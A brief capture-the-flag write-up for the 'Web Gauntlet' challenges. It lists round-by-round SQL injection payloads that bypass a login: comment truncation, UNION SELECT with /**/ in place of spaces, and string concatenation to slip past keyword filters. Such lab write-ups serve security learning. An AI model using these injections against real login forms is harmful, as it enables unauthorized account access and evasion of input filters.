# Web Gauntlet - sqli

SQL query: 
```sql
SELECT * from users where username=admin;'-- AND password=aaa
```

Round 1: `user=admin;'-- &pass=aaa`  
Round 2 and 3: `user=admin'/** &pass=aaa` 
Round 4: 
1. Use UNION SELECT statement  
2. Bypass space by using /**/ comments  
`user=bob'/**/UNION/**/SELECT/**/*/**/FROM/**/users/**/LIMIT/**/1;/**&pass=aaa`

Round 5: `user=adm'||'in'/** &pass=aaa`


# Web Gauntlet 2

`user=adm'||'in&pass=a' is not 'b`

